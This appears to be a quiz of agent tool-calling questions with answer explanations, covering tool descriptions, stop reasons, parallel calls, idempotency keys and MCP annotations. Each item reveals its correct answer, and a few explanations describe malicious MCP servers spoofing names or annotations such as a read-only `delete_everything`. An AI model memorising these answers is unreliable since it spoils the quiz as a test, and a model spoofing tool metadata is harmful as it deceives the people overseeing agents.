title: Agents and Tool Calling: What Could Go Wrong?
description: Forty-two questions on how tool-using agents break. Covers schema and description design, the agent loop and when it stops, parallel versus sequential calls, idempotency under retries, error messages as model input, MCP trust boundaries, prompt injection through tool results, and least privilege for agent credentials. Every explanation links to a specification, vendor document, or paper.

questions.title: An agent keeps calling the wrong tool. What should you fix first?
questions.description: Your agent exposes `search_users` and `search_companies`. When a user asks "find the account for Acme Corp", the model calls `search_users` about a third of the time. A teammate wants to append `CRITICAL: NEVER use search_users to look up companies.` to the system prompt.

options.text: The `description` and parameter descriptions on the two tools, since that is the text the model reads when it chooses between them
The system prompt, by escalating the prohibition until the model complies
The sampling temperature, lowered so that tool choice becomes deterministic
The handler, by making `search_users` detect company-shaped queries and quietly forward them

questions.explanation:
Tool definitions go into the model's context on every request. A description is not documentation for humans. It is prompt text sitting next to your system prompt, and Anthropic's advice is to write it the way you would brief a new hire, including things like specialized query formats and how the resources relate to each other.

Two tools whose descriptions both open with "Search for records..." are ambiguous by construction. Naming the boundary inside each one fixes the problem where the decision actually happens: "Use this for people. For organizations, use the company search tool."

The escalation instinct usually backfires. Current models follow system prompts closely, so all-caps prohibitions written for older and more stubborn models now cause over-triggering elsewhere. Determinism is not correctness either, since a consistently wrong choice is still wrong. Rerouting inside the handler is worse again: the tool now behaves differently from what it advertises, and that gap is the one thing the model has no way to discover.
questions.references: [Anthropic Engineering: Writing effective tools for AI agents](https://www.anthropic.com/engineering/writing-tools-for-agents) · [Anthropic: Define tools](https://platform.claude.com/docs/en/agents-and-tools/tool-use/define-tools)

questions.title: Which content belongs in a tool's `description` rather than in the system prompt?
questions.description: Select all that apply. Your answer must include every correct choice.

options.text: The trigger condition, meaning the circumstances under which this tool should be called
What the tool does not return, plus its limits such as rate caps, maximum page size, or how stale the data can be
The meaning and units of each parameter, including which formats are accepted
A multi-turn worked example showing a user asking a question and the assistant replying
Instructions for talking to the user afterwards, such as "always recommend the premium plan once results come back"

questions.explanation:
A tool description carries two things: a contract and a trigger.

The contract half covers parameter meanings, units, accepted formats, limits, and anything deliberately missing from the response. None of that is recoverable from anywhere else, and when the stated contract disagrees with the real behavior, the model heads down paths that no amount of system-prompt text will correct. The trigger half matters because a model that does not know when a tool applies will simply under-call it.

What does not belong is conversational steering and teaching material. A worked dialogue burns tokens on every single request, and descriptions ride along with all of them. Move that material into skills or docs the model can load on demand. Behavior smuggled into a description ("always recommend...") is a system-prompt instruction wearing a tool definition's clothes, and it applies whenever the tool is in scope rather than when you meant it to.
questions.references: [Anthropic Engineering: Writing effective tools for AI agents](https://www.anthropic.com/engineering/writing-tools-for-agents) · [MCP specification: Tools, Data Types](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: What is the documented risk when a request does not supply a required tool parameter?
questions.description: Your `get_weather` tool declares `location` as required. The user types only: "What's the weather?"

options.text: The model may invent a plausible value and call the tool anyway instead of asking
The API rejects the request with a validation error before the model ever sees it
The model reliably asks a clarifying question, because the parameter is marked required
The tool is quietly dropped from the available set for that turn

questions.explanation:
Anthropic's documentation says outright that a model given "What's the weather?" alongside a `location`-requiring tool "might guess values you didn't supply". The published example shows it inventing both `location: "New York, NY"` and a `unit` nobody mentioned.

Capability shifts the odds but does not settle them. More capable models are likelier to notice the gap and ask, yet the docs add that this behavior "is not guaranteed, especially for more ambiguous prompts and for less capable models".

So `required` is a schema constraint, not a conversational one. It guarantees the field will be present. It never guarantees the value is grounded in anything the user said. When a wrong guess is expensive, such as a transfer amount, an account id, or a delete target, put the check in your handler or behind an explicit confirmation step rather than trusting the word `required`.
questions.references: [Anthropic: Tool use overview, When required parameters are missing](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview)

questions.title: What does strict schema enforcement on tool inputs actually guarantee?
questions.description: You set `strict: true` on a tool whose schema has `additionalProperties: false` and a complete `required` list.

options.text: That the arguments will validate against your schema, but not that they are the right arguments for what the user asked
That the model will choose this tool only when it is genuinely the right one
That every string field will name a real, existing entity in your system
That the call is safe to execute without any further authorization check

questions.explanation:
Strict mode is a decoding constraint. It takes a whole class of failure, including malformed JSON, missing fields, invented extra fields, and wrong types, and moves it from runtime to impossible. That is genuinely useful, and it removes the retry-on-parse-error loop most integrations start life with. It says nothing about meaning.

`delete_user({"user_id": "u_88213"})` validates perfectly and may still be the wrong user. Schema strictness and authorization are separate layers: the schema constrains shape, your handler constrains permission, and a confirmation step constrains intent.

The practical limits matter too. Strict mode needs `additionalProperties: false` and a `required` list, and it does not support recursive schemas, numeric constraints like `minimum` and `maximum`, or string constraints like `minLength`. Ranges still have to be checked in your handler.
questions.references: [Anthropic: Strict tool use](https://platform.claude.com/docs/en/agents-and-tools/tool-use/strict-tool-use) · [Anthropic: Structured outputs](https://platform.claude.com/docs/en/build-with-claude/structured-outputs)

questions.title: Which change most reliably stops a model from emitting an invalid `status` value?
questions.description: Your ticketing tool accepts `status`, and your backend recognizes exactly `open`, `pending`, and `closed`. The model periodically sends `in_progress`, `Open`, and `awaiting-customer`.

options.text: Declare the field as `{"type": "string", "enum": ["open", "pending", "closed"]}` in the input schema
Keep the field a free-form string and list the three legal values in its `description`
Add a line to the system prompt enumerating the legal statuses
Validate on the server and return `"Error: invalid status"` when the value is unrecognized

questions.explanation:
An `enum` is a machine-checkable constraint on the arguments the model generates. A sentence in a description or system prompt is only a suggestion, competing for attention with everything else in context. When the legal set is small, closed, and stable, encoding it in the schema beats describing it, and the enum doubles as documentation without spending prose.

Server-side validation is not wrong. It is a different layer, and the version shown here is a poor one, because `"Error: invalid status"` gives the model nothing to correct toward. If you validate on the server, name the offending value and the accepted set: `Unknown status "in_progress". Accepted values: open, pending, closed.` Then the retry is informed rather than another guess.

Use both. The enum prevents most failures, and a good error message handles whatever gets past it.
questions.references: [Anthropic: Define tools](https://platform.claude.com/docs/en/agents-and-tools/tool-use/define-tools) · [MCP specification: Tools, Data Types](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: Two connected MCP servers each expose a tool named `search`. What does the specification say about the collision?

options.text: Tool-name uniqueness is scoped to a single server, so an aggregating client should disambiguate on its own, for example by prefixing with a server identifier
MCP guarantees globally unique tool names, so this cannot happen
The client must refuse the second connection until an operator renames one of the tools
The most recently connected server wins and the earlier definition is shadowed

questions.explanation:
The specification says tool names "**SHOULD** be unique within a server" and then notes that clients or proxies aggregating tools from several servers may hit collisions and "**SHOULD** implement a disambiguation strategy such as prefixing tool names with a server identifier". There is no global namespace at the protocol level.

The obvious fix has a catch. The spec warns that the server `name` from `serverInfo` "is not guaranteed to be unique across servers and **SHOULD NOT** be relied upon for disambiguation", because a malicious server can simply claim to be `github`. Build the prefix from something the client controls, such as the local connection configuration, rather than from anything the server says about itself.

Silent shadowing is the worst of the four outcomes, since it lets a newly added server capture calls the user believes are going somewhere else.
questions.references: [MCP specification: Tools, Tool Names](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: Why does the MCP specification say servers should return tools in a deterministic order?

options.text: So clients can cache the tool list, and so the tool block stays byte-identical between requests and keeps hitting the LLM prompt cache
Because the model evaluates tools in order and takes the first one that plausibly matches
Because JSON-RPC requires arrays in responses to be sorted
So that concurrent tool calls execute in the order the tools were listed

questions.explanation:
The spec gives the reason directly: "Deterministic ordering enables clients to reliably cache the tool list and improves LLM prompt cache hit rates when tools are included in model context."

This is a small detail with a large bill attached. Tool definitions render at the very front of the prompt, ahead of the system prompt and the conversation. Prompt caching is a prefix match, so one reordered tool changes bytes at position zero and invalidates the cache for the entire request. Every turn of a long agent session then pays full price for context it has already sent.

A server that builds its tool list by iterating a hash map can multiply a customer's bill without changing a single tool. Sorting by name costs nothing and fixes it.
questions.references: [MCP specification: Tools, Capabilities](https://modelcontextprotocol.io/specification/latest/server/tools) · [Anthropic: Prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching)

questions.title: Which `stop_reason` value does the Claude Messages API return when the model wants you to run a client-side tool and send the result back?
questions.description: Answer with the exact string value the API returns.
questions.explanation:
`stop_reason: "tool_use"` means the model has emitted one or more `tool_use` blocks and is waiting on you. The documented continuation is a user message of `tool_result` blocks, one for every `tool_use` block in the response, with two extra rules: that message must contain nothing but the `tool_result` blocks, and the request must keep the same `tools` array.

Learn the whole set, because agent loops branch on it. `end_turn` means the model finished naturally. `max_tokens` means it hit your output cap. `stop_sequence` means it emitted one of your stop strings. `tool_use` means run the tool. `pause_turn` means a server-tool loop hit its iteration limit, and you resend the response as-is. `refusal` means the model declined, and you read `stop_details`. `model_context_window_exceeded` means the response filled the context window.

Treating anything besides `tool_use` and `pause_turn` as a signal to continue is how loops fail to terminate.
questions.references: [Anthropic: Handling stop reasons](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons)

questions.title: How should an agent loop respond to `stop_reason: "pause_turn"`?
questions.description: Your request declares the server-side web search tool. The response comes back with `stop_reason: "pause_turn"` and no client `tool_use` block.

options.text: Append the assistant response as-is to the messages array and send another request, letting the server pick up where it left off
Append the assistant response, then a user message saying "Continue."
Treat it as a transient failure and re-send the original request from scratch
Find the client `tool_use` block that must be present and execute it

questions.explanation:
`pause_turn` comes back when the server-side sampling loop reaches its iteration limit while running server tools. The default is 10 iterations per request. The documented fix is to "continue the conversation by sending the response back as-is", because the trailing `server_tool_use` block is what tells the server to resume. Adding "Continue." is not just unnecessary, it changes the conversation you are asking the model to continue.

The idea that a client `tool_use` block must be waiting is the one to unlearn, since the two pause-like states are easy to confuse. The docs draw a sharp line: a response that leaves a client `tool_use` block waiting on you never has `stop_reason: "pause_turn"`. When the model stops to call your tools the reason is `tool_use`, and you continue by sending `tool_result` blocks instead of the response itself.

Restarting from scratch throws away server-side work you have already paid for.
questions.references: [Anthropic: Handling stop reasons, pause_turn](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons)

questions.title: The response ends with an incomplete `tool_use` block and `stop_reason: "max_tokens"`. What is the correct recovery?

options.text: Retry the request with a higher `max_tokens`, because a half-emitted call cannot be executed
Parse the partial JSON, fill the missing fields with schema defaults, and execute the call
Return a `tool_result` with `is_error: true` explaining that the call was truncated
Append a user message asking the model to repeat the tool call more concisely

questions.explanation:
Anthropic's guidance is direct: check whether the last content block is an incomplete `tool_use`, and if it is, re-send with a higher `max_tokens` to get the full call. There is no partial-call recovery path. You have a prefix of a JSON object, and inferring the rest means inventing arguments for a call the model never finished writing.

Returning a `tool_result` is not merely wasteful, it is invalid. A `tool_result` has to reference a completed `tool_use` block by its `tool_use_id`, and a truncated block has no committed id to reference.

The forward-looking fix is budgeting. `max_tokens` caps the entire output, and on models with extended or adaptive thinking enabled, thinking tokens and response text share that budget. A limit tuned against a non-thinking baseline can start truncating tool calls the moment you turn reasoning on.
questions.references: [Anthropic: Handling stop reasons, max_tokens](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons)

questions.title: What is the correct termination condition for a tool-calling agent loop?

options.text: Branch on `stop_reason`: continue only while it is `tool_use` or `pause_turn`, and exit on the terminal values
Exit as soon as the assistant message contains a text block, since that means the model is addressing the user
Exit when the assistant's text says the task is complete
Exit after a fixed number of iterations, with no other check

questions.explanation:
`stop_reason` is the only structured termination signal the API gives you, and the only one that separates "I need something from you" from "I am done". Continue on `tool_use` by sending `tool_result` blocks, and on `pause_turn` by resending the assistant content. Exit on `end_turn`, `max_tokens`, `stop_sequence`, `refusal`, and `model_context_window_exceeded`, remembering that several of those are failures you should surface rather than successes.

Both prose-based conditions are bugs. A single response can contain text blocks and `tool_use` blocks together, so exiting on "there is text" drops pending calls on the floor. Exiting on a self-declaration is worse, because a model can end a turn with a statement of intent such as "I'll now run the migration" and no tool call at all. Trust the prose and you report success for work that never happened.

A fixed iteration cap is a necessary backstop against runaway cost. As the primary condition it either truncates real work or turns a stuck loop into a confident wrong answer.
questions.references: [Anthropic: Handling stop reasons](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons) · [Anthropic: Handle tool calls](https://platform.claude.com/docs/en/agents-and-tools/tool-use/handle-tool-calls)

questions.title: A search tool returns an empty string when nothing matches. Why does the agent then call it six times?
questions.description:
```py
def search_orders(query: str) -> str:
    rows = db.search(query)
    return "\n".join(format(r) for r in rows)   # "" when rows is empty
```
The user asks about an order that genuinely does not exist. The agent retries with progressively looser queries, then reports that the search tool seems broken.

options.text: An empty result looks identical to a broken tool, so return a message saying the search ran, what it searched, and how to widen it
Set `is_error: true` on the empty result so the model knows the call produced no data
Return `null` instead of an empty string, which is unambiguous
Raise a protocol-level error so the client stops the model from retrying

questions.explanation:
The tool result is the model's entire view of the outside world. An empty string says nothing about why it is empty, so the model does the reasonable thing with an ambiguous signal and varies the input to try again.

Compare that to `Found 0 orders matching "acme-2024" in the last 90 days. Widen the window with date_from, or search by customer_id instead.` This ends the loop in one turn because it separates "asked correctly, nothing there" from "asked wrongly".

Flagging a successful zero-result query as an error makes things worse. It tells the model the call failed, which is the belief that produces retry-until-success behavior. Keep error flags for calls that did not do what they were asked. `null` has the same emptiness problem as `""`. A protocol error is the wrong channel entirely, since those are for malformed requests and unknown tools, and the specification notes they are "less likely to result in successful recovery" because they carry nothing the model can act on.
questions.references: [Anthropic Engineering: Writing effective tools for AI agents](https://www.anthropic.com/engineering/writing-tools-for-agents) · [MCP specification: Tools, Error Handling](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: Which are sound reasons to cap the number of iterations in a client-side agent loop?
questions.description: Select all that apply. Your answer must include every correct choice.

options.text: Cost, because a loop that keeps calling tools has no upper bound on spend
Livelock, because a model can retry a persistently failing call indefinitely instead of giving up
Context growth, because every turn appends a `tool_use` and `tool_result` pair until the window fills
Correctness, because reaching the cap shows the task was completed within budget
Necessity, because the API rejects conversations containing more than ten tool calls

questions.explanation:
All three correct reasons bound damage rather than produce a result: unbounded spend, non-terminating retries, and context that only ever grows. A cap is a circuit breaker.

Treating the cap as evidence of completion inverts what it means. Hitting it shows the agent did not converge, so it is a failure to report, not a success.

The ten-tool-call claim is a real fact attached to the wrong loop. There is a ten-iteration default limit, but it belongs to the server-side sampling loop that runs server tools such as web search, and exceeding it produces `stop_reason: "pause_turn"` rather than an error. You continue by resending the response. Your own client-side loop has no API-imposed ceiling, which is why you have to impose one.
questions.references: [Anthropic: Handling stop reasons, pause_turn](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons) · [Anthropic Engineering: Building effective agents](https://www.anthropic.com/engineering/building-effective-agents)

questions.title: Why did parallel tool calling gradually stop happening in this conversation history?
questions.description:
The model emitted two `tool_use` blocks in one assistant turn. The integration appends each result as its own user message:
```json
[
  {"role": "assistant", "content": ["tool_use_1", "tool_use_2"]},
  {"role": "user", "content": ["tool_result_1"]},
  {"role": "user", "content": ["tool_result_2"]}
]
```

options.text: Splitting results across separate user messages teaches the model that parallel calls are not handled, so it stops making them
Nothing is wrong with the formatting, since parallel calling is simply nondeterministic
The API requires an assistant acknowledgement between consecutive tool results
The API rejects more than one `tool_result` block in a single user message

questions.explanation:
Anthropic's documentation names this as the most common cause of vanishing parallel calls, and labels the two shapes plainly. Wrong: a separate user message for each tool result. Correct: all tool results together in a single user message. The conversation history is few-shot evidence about how your integration behaves, so a transcript where parallelism was always answered serially trains the model out of it.

The correct shape is one user message holding one `tool_result` per `tool_use` block, each matched by `tool_use_id`, with every `tool_result` block placed before any text content in that message.

Note the inversion in the claim that the API rejects more than one `tool_result` per user message. Several results in one message is not merely allowed, it is the required form.
questions.references: [Anthropic: Parallel tool use, Troubleshooting](https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use)

questions.title: Where is `disable_parallel_tool_use` specified in an Anthropic Messages API request?

options.text: As a field inside the `tool_choice` object, which can be combined with any `tool_choice` type
As a top-level request parameter alongside `tools` and `messages`
As a field on each tool definition, next to `name` and `input_schema`
As a beta header on the HTTP request

questions.explanation:
It lives inside `tool_choice`. Writing `{"type": "auto", "disable_parallel_tool_use": true}` leaves the model free to answer without tools while limiting it to at most one call per response, and `{"type": "any", "disable_parallel_tool_use": true}` forces exactly one. Any `tool_choice` type accepts the flag, which is what makes it composable: you constrain how many calls, independently of whether and which.

The per-tool option describes something the API deliberately does not offer. There is no way to say "this one tool is never safe to run alongside others". Parallel-safety is a property of your execution strategy rather than of a single declaration, so if only some of your tools are unsafe to interleave, enforce that in the harness by serializing those calls when they arrive.
questions.references: [Anthropic: Parallel tool use](https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use) · [Anthropic: Define tools, Forcing tool use](https://platform.claude.com/docs/en/agents-and-tools/tool-use/define-tools)

questions.title: Which tool-call batches must not be run concurrently just because the model emitted them in one turn?
questions.description: Select all that apply. Your answer must include every correct choice.

options.text: `write_file(path="cfg.json", ...)` and `read_file(path="cfg.json")`, where the read is meant to observe the write
`create_branch(name="fix")` and `push_to_branch(name="fix", ...)`, where the second needs the first to have succeeded
Two `append_to_ledger` calls whose relative order decides the resulting balance
Three `grep` calls over three different directories
Two `get_weather` calls for two different cities

questions.explanation:
The API is explicit that it "doesn't prescribe an execution order". Several `tool_use` blocks in one assistant turn are a set of requested operations, not a promise that they commute. Concurrency is your call, and the criterion is dependency rather than adjacency.

Read-after-write, create-then-use, and order-sensitive appends all have real happens-before edges that a `Promise.all` erases. Because the result is a race, it will pass in testing and fail under load.

The two safe batches share the property that makes parallelism worth doing: independent, read-only, no shared mutable state. That matches the documented heuristic, which is that independent read-only operations are usually safe to run in parallel for lower latency, while tools with side effects, shared state, or ordering requirements are better run sequentially. Nothing stops a model from emitting a dependent batch, so noticing one and serializing it is the harness's job.
questions.references: [Anthropic: Parallel tool use, Execution semantics](https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use)

questions.title: You ran a batch sequentially, an early call failed, and you never executed the last one. What do you send back for it?

options.text: A `tool_result` with `is_error: true` and a short explanation such as "Not executed: the preceding write_file call failed."
Nothing, since there is no result to report
A text block in the same user message explaining why it was skipped
A `tool_result` with empty content, so the model treats it as a no-op

questions.explanation:
Every `tool_use` block needs a matching `tool_result`, and the documentation covers this exact case. If you choose not to run a particular call, for example because you ran the batch sequentially and an earlier call failed, still return a `tool_result` for it with `is_error: true` and a brief explanation. Omitting it leaves a dangling `tool_use` and produces an API error rather than graceful degradation.

The two softer options fail differently. A text block is not addressed to any call, since nothing binds it to a `tool_use_id`, so the model has to guess which pending call you mean. An empty successful result is worse than useless: it asserts that the operation ran and produced nothing, which is the wrong belief when the operation never ran.

Saying "not executed because X failed" lets the model fix the upstream problem and re-issue the batch, which is the reason to feed errors back at all.
questions.references: [Anthropic: Parallel tool use, Execution semantics](https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use) · [Anthropic: Handle tool calls](https://platform.claude.com/docs/en/agents-and-tools/tool-use/handle-tool-calls)

questions.title: Why can a harness parallelize a `grep` tool but must serialize the same search issued through a general `bash` tool?

options.text: A dedicated tool arrives as typed arguments the harness can classify as read-only, while `bash` arrives as one opaque command string where a safe search is indistinguishable from a destructive push
Shell processes cannot run concurrently, so the harness has no choice
Models emit `bash` calls one at a time by construction, so the question never comes up
JSON Schema forbids concurrent execution of tools that accept free-form strings

questions.explanation:
This is the general case for narrow tools over open-ended ones, seen through scheduling. `grep(pattern, path)` tells the harness what kind of operation it is before it runs, so the call can be batched with other reads, gated differently from writes, rendered in the UI, and audited by name. `bash("...")` collapses every possible action into one signature. The same call could be a `grep`, an `rm -rf`, or a `git push`, and the harness cannot tell without parsing shell, which is a losing game against pipes, subshells, and aliases.

OWASP's Excessive Agency guidance reaches the same conclusion from the security side. It lists "avoid the use of open-ended extensions where possible" among its preventions, and recommends limiting the functions exposed to an agent to the minimum necessary. MCP encodes the idea in the protocol with a `readOnlyHint` annotation on each tool, a per-tool claim that only means something when tools are narrow enough for it to mean something.

The practical rule: start with `bash` for breadth, then promote to dedicated tools whatever you need to gate, render, audit, or parallelize.
questions.references: [OWASP Top 10 for LLM Applications: LLM06:2025 Excessive Agency](https://genai.owasp.org/llmrisk/llm062025-excessive-agency/) · [Anthropic Engineering: Writing effective tools for AI agents](https://www.anthropic.com/engineering/writing-tools-for-agents)

questions.title: Results come back from a worker pool out of order. How do you associate each one with the call that produced it?
questions.description: The assistant turn contained three `tool_use` blocks. You dispatched them with `asyncio.gather` and are now assembling the reply.

options.text: By the `tool_use_id` carried on each `tool_use` block, copied onto the corresponding `tool_result`
By array position, since the results array mirrors the calls array
By tool name, since each call names the tool it invoked
By completion timestamp, oldest first

questions.explanation:
Each `tool_use` block carries an id, and the matching `tool_result` has to repeat it in `tool_use_id`. That id is the only stable identity in the exchange, which is why the API requires it instead of relying on order.

The other three approaches all break on the same case, and it happens to be the most common shape of a parallel batch: two calls to the same tool with different arguments, such as `get_weather("Paris")` and `get_weather("Tokyo")`. Names are ambiguous there by definition.

Positional matching is the dangerous one. It survives a naive sequential loop, then silently swaps results as soon as you introduce a concurrent pool, attributing Tokyo's forecast to Paris with no error anywhere. Timestamps record when work finished, which has nothing to do with which call it belongs to. The same discipline applies wherever responses can be reordered, including batch APIs, which return results in any order and must also be keyed by an explicit id.
questions.references: [Anthropic: Handle tool calls](https://platform.claude.com/docs/en/agents-and-tools/tool-use/handle-tool-calls) · [Anthropic: Parallel tool use](https://platform.claude.com/docs/en/agents-and-tools/tool-use/parallel-tool-use)

questions.title: By RFC 9110's definition, what makes a request method idempotent?

options.text: The intended effect on the server of several identical requests is the same as the effect of a single such request
The method produces no side effects on the server at all
Repeated requests return byte-identical response bodies
The server returns the same status code every time

questions.explanation:
RFC 9110 §9.2.2 defines it in terms of intended effect on the server: a method is idempotent if the intended effect on the server of multiple identical requests with that method is the same as the effect for a single such request. The RFC's own list is "PUT, DELETE, and the safe request methods", which gives you PUT, DELETE, GET, HEAD, OPTIONS, and TRACE. POST is not idempotent. The payoff appears in the same section: clients may automatically repeat requests with idempotent methods when a connection failure occurs before a response arrives.

The three wrong answers are near-misses worth separating. "No side effects at all" defines safe, a stronger property. GET is both safe and idempotent, while DELETE is idempotent but not safe.

Identical responses are not required. `DELETE /doc/7` can legitimately return 204 and then 404, which are different responses describing the same end state. And the RFC is explicit that idempotency covers only what the client requested, so a server may still write an audit log entry, bump a counter, or fire a webhook on every request. Idempotent never means that nothing observable differs.
questions.references: [RFC 9110 §9.2.2: Idempotent Methods](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.2.2)

questions.title: In MCP tool annotations, what is the default value of `idempotentHint` when a server does not set it?
questions.description: Answer with the literal JSON value.
questions.explanation:
`idempotentHint` defaults to `false`, so repeating a call is assumed to have additional effect unless the server says otherwise.

The whole annotation set defaults pessimistically, and the asymmetry is deliberate. `readOnlyHint` defaults to `false` while `destructiveHint` defaults to `true`, so a tool that declares nothing is treated as a writing, destructive, non-idempotent, open-world tool. Silence never buys leniency.

Two details are easy to miss. Both `destructiveHint` and `idempotentHint` are, in the schema's words, "meaningful only when `readOnlyHint == false`", so for a read-only tool they describe nothing. And `openWorldHint` also defaults to `true`, meaning the tool is assumed to reach an open set of external entities. The schema contrasts a web search tool, which is open, with a memory tool, which is not.
questions.references: [MCP schema: ToolAnnotations](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/schema/2025-06-18/schema.ts) · [MCP specification: Tools](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: A remote MCP server advertises `delete_everything` with `readOnlyHint: true`. What does the specification require of the client?

options.text: Treat the annotation as untrusted unless the server is trusted, and never let it be the reason a confirmation prompt is skipped
Honor the annotation, since a server is authoritative about its own tools
Reject the tool as schema-invalid, because the name contradicts the annotation
Prompt for confirmation once, then cache the annotation as verified for the rest of the session

questions.explanation:
The specification carries a standing warning: "For trust & safety and security, clients **MUST** consider tool annotations to be untrusted unless they come from trusted servers." The schema is blunter. All properties in `ToolAnnotations` are hints, they "are not guaranteed to provide a faithful description of tool behavior (including descriptive properties like `title`)", and clients "should never make tool use decisions based on ToolAnnotations received from untrusted servers".

The reason is structural rather than a question of server honesty. Annotations are self-asserted metadata with no verification mechanism anywhere in the protocol, so an attacker-controlled server can claim anything at no cost. That makes them a fine input to the user experience, for sorting, iconography, and sensible defaults from a server you already trust, and useless as a security control.

Nothing in the protocol checks a name against an annotation, and caching an unverifiable claim only launders it into something that looks checked.
questions.references: [MCP specification: Tools, Data Types](https://modelcontextprotocol.io/specification/latest/server/tools) · [MCP schema: ToolAnnotations](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/schema/2025-06-18/schema.ts)

questions.title: A payment tool timed out, the model retried, and the customer was charged twice. What is the actual defect?

options.text: A timeout says nothing about whether the operation ran, so retry safety has to come from an idempotency key rather than from the error text
The timeout is too short, and raising it to 120 seconds removes the double charge
The system prompt should instruct the model never to retry payment tools
The tool should be annotated `readOnlyHint: true` so that clients do not repeat it

questions.explanation:
A client-side timeout describes the client's patience, not the server's state. The request may have been dropped in transit, or it may have been processed in full with only the response lost. Those two are indistinguishable from where the caller sits, and "Try again" invites the model to gamble on the first reading.

Attach a key the server can use to recognize a retry as the same logical operation and the ambiguity stops mattering. The second call returns the first call's outcome instead of creating a new charge.

A longer timeout narrows the window without closing it, and moves the failure into the slow tail where it is harder to reproduce. A prompt instruction puts a probabilistic control in front of a financial invariant, and it costs you legitimate retries as well. The annotation is wrong twice over: it is a false claim about a tool that plainly writes, and per the specification clients must treat annotations from untrusted servers as unverified anyway.
questions.references: [IETF: The Idempotency-Key HTTP Header Field](https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-idempotency-key-header) · [RFC 9110 §9.2.2: Idempotent Methods](https://www.rfc-editor.org/rfc/rfc9110.html#section-9.2.2)

questions.title: Who must generate an idempotency key, and when, for retry safety to hold?

options.text: The caller, once per logical operation, reusing the same value unchanged on every retry of that operation
The server, which returns a key that the client attaches to later attempts
The model, emitting a fresh key as a tool parameter on each call
The transport layer, deriving one from a timestamp and the request path

questions.explanation:
The property you need is that two attempts at the same intent carry the same key. Only the caller knows that two HTTP requests are one intent, so the key is minted where the retry loop lives, in your harness, before the first attempt, and held constant across every retry. The IETF draft recommends a UUID or similar random identifier for the value.

Making it a model-supplied tool parameter is the trap, and it is common because it looks tidy in the schema. The model has no obligation to reproduce a previous value, no visibility into whether the harness already retried underneath it, and every incentive to sample something new on a fresh turn. The key then varies at the exact moment it must not, and you have built an audit field that resembles a safety mechanism.

A server-minted key requires a successful round trip before you are protected, and that round trip is the one that failed. Timestamp-derived keys change on every attempt by construction, which is the opposite of what a key is for.
questions.references: [IETF: The Idempotency-Key HTTP Header Field](https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-idempotency-key-header)

questions.title: The same `Idempotency-Key` arrives with a different request payload. What should the server do?

options.text: Reject it, since the draft says a key must not be reused with a different payload and recommends replying `422`
Return the stored response from the first request that used the key
Process it as a brand-new request, since the payload differs
Overwrite the stored record so the newer payload becomes canonical

questions.explanation:
The draft states that the idempotency key "MUST be unique and MUST NOT be reused with another request with a different request payload", and that on such an attempt "the resource SHOULD reply with a HTTP `422` status code". A key and payload mismatch is not a retry. It is a bug or an attack, and the honest response is to refuse rather than guess which of two different operations the caller meant.

Each wrong answer quietly loses one of the two operations. Returning the stored response is correct for a genuine replay of the same payload, but here it reports success for work that was never performed. Processing it as new throws away the deduplication the key exists to provide. Overwriting corrupts the record that later retries of the original operation depend on.

For completeness, the draft covers the other two cases as well. A retry with the same key while the first request is still in flight should get a conflict error, and a retry after completion should get the stored outcome, whether that was success or an error.
questions.references: [IETF: The Idempotency-Key HTTP Header Field](https://datatracker.ietf.org/doc/html/draft-ietf-httpapi-idempotency-key-header)

questions.title: An MCP tool's upstream API rejects a badly formatted date. Which error channel should the server use?

options.text: A normal tool result with `isError: true`, carrying a message the model can act on
A JSON-RPC protocol error with code `-32602`
A successful result with `isError: false` whose text explains the problem
No response, letting the client's timeout surface the failure

questions.explanation:
MCP defines two error channels and splits them by who can fix the problem.

Protocol errors cover unknown tools, malformed requests, and server errors. They come back as JSON-RPC errors and describe problems "that models are less likely to be able to fix". Tool execution errors cover API failures, input validation, and business logic. They go in the result with `isError: true` and "contain actionable feedback that language models can use to self-correct and retry with adjusted parameters". A wrong date format is squarely the second kind, and the spec's own example is shaped like the fix: `Invalid departure date: must be in the future. Current date is 08/08/2025.`

The routing rules follow from that split. Clients **SHOULD** provide tool execution errors to language models to enable self-correction, and **MAY** provide protocol errors, "though these are less likely to result in successful recovery". Choosing the protocol channel for a recoverable input problem risks the model never seeing the one thing it needed. Reporting a failure as a success is worse, since the model may treat the explanatory prose as data. Letting the call hang burns the timeout budget and returns nothing at all.
questions.references: [MCP specification: Tools, Error Handling](https://modelcontextprotocol.io/specification/latest/server/tools)

questions.title: Which error string gives a model the best chance of fixing its own call on the next turn?
questions.description: The tool rejected a booking because the requested departure date has already passed.

options.text: `Invalid departure date: must be in the future. Current date is 2026-08-07.`
`Error: ERR_VALIDATION_4471`
`Traceback (most recent call last): File "/srv/booking/handlers.py", line 212, in create ... ValueError`
`Something went wrong. Please try again.`

questions.explanation:
An error returned to an agent is not a log line. It is the next prompt. The winning message names the field, states the rule that was broken, and supplies the missing fact, today's date, that the model needs in order to build a valid value. It turns a retry into a correction. Anthropic's tool-writing guidance is to provide "specific and actionable improvements, rather than opaque error codes or tracebacks".

The others fail in different ways. An opaque code means nothing to a model that has never seen your error table, so it retries the identical call. "Try again" invites exactly that, implying transience where the problem is deterministic.

The traceback is the most interesting failure. It is verbose, mostly irrelevant, and it leaks internal paths, module layout, and sometimes configuration or credentials into a transcript that may be logged, replayed into later turns, or summarized back to a user. Detail is good. Internal detail is a separate decision.
questions.references: [Anthropic Engineering: Writing effective tools for AI agents](https://www.anthropic.com/engineering/writing-tools-for-agents) · [MCP specification: Tools, Error Handling](https://modelcontextprotocol.io/specification/latest/server/tools)

